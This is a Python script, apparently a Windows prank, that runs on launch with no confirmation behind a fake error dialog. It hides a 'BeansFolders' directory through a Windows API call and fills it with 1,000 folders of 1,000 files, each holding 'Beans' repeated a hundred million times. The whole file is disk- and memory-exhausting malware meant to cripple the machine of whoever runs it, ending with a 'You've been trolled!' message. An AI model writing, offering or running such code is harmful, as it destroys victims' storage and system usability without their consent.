import os
from tkinter import messagebox
import ctypes

def clear():
    os.system('cls')

def main(base_path):
    create_mainfolder(base_path)
    create_secondary_folders(base_path)
    messagebox.showinfo("Success", "You've been trolled!")


def create_mainfolder(base_path):
    if os.path.exists(base_path):
        #print("'BeansFolders' folder already exists")
        pass
    else:
        #print("Creating folder...")
        os.makedirs(base_path)
        # Set the folder attribute to hidden
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(base_path, FILE_ATTRIBUTE_HIDDEN)
        if ret:
            #print("'BeansFolders' folder created and hidden")
            pass
        else:
            # If there was an error, get the last error code
            error = ctypes.GetLastError()
            print(f"Failed to hide 'BeansFolders' folder. Error code: {error}")

def create_secondary_folders(base_path):
    for folder_num in range(1, 1001):
        folder_path = os.path.join(base_path, f'Beans_{folder_num}')
        os.makedirs(folder_path, exist_ok=True)
        #clear()
        #messagebox.showinfo("Success", f"{folder_num} folders have been created so far!")
        #print(f"Folders created:\n [{folder_num}/1000]")
        create_files(base_path, folder_num)

def create_files(base_path, folder_num):
    folder_path = os.path.join(base_path, f'Beans_{folder_num}')
    for file_num in range(1, 1001):
        file_path = os.path.join(folder_path, f'Beans_{file_num}.txt')
        with open(file_path, 'w') as file:
            file.write('Beans\n' * 10000 * 10000)
            #print(f"Created file: \n Number: {file_num} \n Path: '{file_path}'")

def startup():
    #user_input = input("Start the program? (y/n): ")
    #if user_input.lower() == 'y':
    #    print("Starting...")
    #    time.sleep(2)
    main('BeansFolders')
    #else:
    #    clear()
    #    print("Bye!")
    #    time.sleep(2)
    #    quit()
    #    clear()


#try:
messagebox.showerror("Error", "Vishwa broke the stratosphere.")
startup()
#except Exception as e:
    #print(f"Error: {e}")
    #input()

# Pretty confusing, huh?